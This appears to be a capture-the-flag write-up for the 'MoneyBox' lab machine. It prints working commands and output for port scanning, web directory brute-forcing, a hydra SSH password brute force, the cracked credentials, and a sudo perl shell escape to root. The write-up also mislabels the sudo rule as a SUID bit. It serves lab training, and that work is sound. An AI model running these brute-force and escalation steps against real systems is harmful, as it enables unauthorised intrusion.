---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Reconnaissance
### Nmap scan

Let's perform a simple `nmap` scan on the target.

```
$ nmap -Pn -p- -A -T5 192.168.167.230 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-06 11:03 IST
Warning: 192.168.167.230 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.167.230
Host is up (0.11s latency).
Not shown: 62077 closed tcp ports (conn-refused), 3455 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.190
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: MoneyBox
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 460.14 seconds
```

There are three open ports:

| Port | Service |
| :-: | :-: |
| 21   | ftp     |
| 22   | ssh     |
| 80   | http    |

### FTP Enumeration

We can login as the `anonymous` user through FTP.

```
$ ftp anonymous@192.168.167.230                                                                                              
Connected to 192.168.167.230.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We know from the NMAP scan that there is a `trytofind.jpg` file here.

```
ftp> ls
229 Entering Extended Passive Mode (|||50574|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
```

Let's download the `trytofind.jpg` file.

```
ftp> get trytofind.jpg
local: trytofind.jpg remote: trytofind.jpg
229 Entering Extended Passive Mode (|||24295|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |***********************************************************************************************************************************************************************************************|  1068 KiB  308.57 KiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:03 (302.95 KiB/s)
```

We can use steghide to extract potentially stored files from the image, but for that we need a password.

### Directory enumeration

Let's perform some directory brute forcing using `ffuf` to check what web directories are present.

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.167.230/FUZZ      ________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 115ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 115ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 115ms]
                        [Status: 200, Size: 621, Words: 264, Lines: 18, Duration: 117ms]
blogs                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 86ms]
index.html              [Status: 200, Size: 621, Words: 264, Lines: 18, Duration: 74ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 82ms]
:: Progress: [4614/4614] :: Job [1/1] :: 414 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

We can visit the `/blogs` directory through our browser.

![2](https://github.com/Kunull/Write-ups/assets/110326359/9057ef3e-4095-4902-b9be-2b7670c69651)

Let's check the page source.

![3](https://github.com/Kunull/Write-ups/assets/110326359/e68a7e4c-0b41-4ac0-b3cc-f5d7fe956f8c)

Let's visit the `S3cr3t-T3xt` page through our browser.

![4](https://github.com/Kunull/Write-ups/assets/110326359/1626eb4b-58ce-4516-a6e4-4953c74d9ddd)

We can do the same thing we did before: check the page source.

![5](https://github.com/Kunull/Write-ups/assets/110326359/c9b651e3-7f33-4c45-907c-8e3c224cf133)

Maybe this is the password required to extract files from the `trytofind.jpg` file.

### Extracting hidden files using Steghide

```
$ steghide extract -sf trytofind.jpg
Enter passphrase: 
wrote extracted data to "data.txt".
```

Let's `cat` the `data.txt` file.

```
$ cat data.txt     
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

This tells us that maybe there is a user named `renu` on the machine.

| Users |
| :-: |
| renu  |

&nbsp;

## Exploitation

### Brute forcing SSH password

Let's brute force the SSH credentials using `hydra`.

```
$ hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.167.230 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 11:24:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.167.230:22/
[22][ssh] host: 192.168.167.230   login: renu   password: 987654321
```

| Username | Password  |
| :-: | :-: |
| renu     | 987654321 |

### SSH login

We can now login through SSH using the credentials.

```
$ ssh renu@192.168.167.230          
The authenticity of host '192.168.167.230 (192.168.167.230)' can't be established.
ED25519 key fingerprint is SHA256:4skFgbTuZiVgZGtWwAh5WRXgKXTdP7U5BhYUsIg9nWw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.167.230' (ED25519) to the list of known hosts.
renu@192.168.167.230's password: 
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 23 10:00:13 2022
renu@MoneyBox:~$ 
```

&nbsp;

## Post Exploitation

### local.txt

```
renu@MoneyBox:~$ cat local.txt 
2eac5eff43906f3356ef24d84a073c6d
```

### User Enumeration

Upon listing the `/home` directory, we can find that there is another user `lily`.

| Users |
| :-: |
| renu  |
| lily  |

Let's visit the directory of the `lily` user.

```
renu@MoneyBox:~$ cd /home/lily/
renu@MoneyBox:/home/lily$ ls -la
total 32
drwxr-xr-x 4 lily lily 4096 Oct 11  2022 .
drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
-rw------- 1 lily lily  985 Feb 26  2021 .bash_history
-rw-r--r-- 1 lily lily  220 Feb 25  2021 .bash_logout
-rw-r--r-- 1 lily lily 3526 Feb 25  2021 .bashrc
drwxr-xr-x 3 lily lily 4096 Feb 25  2021 .local
-rw-r--r-- 1 lily lily  807 Feb 25  2021 .profile
drwxr-xr-x 2 lily lily 4096 Feb 26  2021 .ssh
```

We can see that there is a `.ssh` directory.

```
renu@MoneyBox:/home/lily$ cd .ssh/
renu@MoneyBox:/home/lily/.ssh$ ls
authorized_keys
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
```

### Switching to the lily user

Since we can access the `ssh-rsa` key, we can login as `lily` without needing a password.

```
renu@MoneyBox:/home/lily/.ssh$ ssh -i id_rsa lily@192.168.167.230
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '192.168.167.230 (192.168.167.230)' can't be established.
ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.167.230' (ECDSA) to the list of known hosts.
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
lily@MoneyBox:~$ 
```

### Privilege Escalation

Let's check what commands `lily` can run with `root` privileges without needing a password.

```
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

We can use this misconfigured SUID bit to escalaet our privileges.

We can find the this payload on [GTFOBins](https://gtfobins.github.io/).

![6](https://github.com/Kunull/Write-ups/assets/110326359/2d8df817-b70a-4887-aabd-d0534811f740)

```
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
```

We are now the `root` user.

### proof.txt

We can now `cat` the `proof.txt` flag.

```
# cat /root/proof.txt
d3bb5fd708d3c15c5d4603dbcde69053
```
